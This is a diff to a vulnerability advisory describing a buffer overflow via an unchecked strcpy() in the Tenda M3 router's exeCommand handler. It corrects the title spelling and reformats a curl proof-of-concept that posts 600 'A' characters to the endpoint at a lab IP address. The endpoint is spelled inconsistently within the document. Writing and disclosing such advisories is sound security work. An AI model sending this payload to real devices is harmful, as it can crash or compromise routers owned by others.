@@ -1,4 +1,4 @@
-# Tenda M3 execCommand Buffer Overflow
+# Tenda M3 exeCommand Buffer Overflow
 
 ## Description
 
@@ -32,7 +32,7 @@ The vulnerability is in the `strcpy()` call with no bounds checking.
 Send a POST request to the `/goform/execCommand` endpoint to trigger the buffer overflow
 
 ```
-curl -X POST http://172.16.182.130/goform/exeCommand   -d "cmdinput=$(python3 -c 'print("A"*600)')"
+curl -X POST http://172.16.182.130/goform/exeCommand -d "cmdinput=$(python3 -c 'print("A"*600)')"
 ```
 
 ![PoC](../resources/imgs/Tenda/execCommandPoC.png)
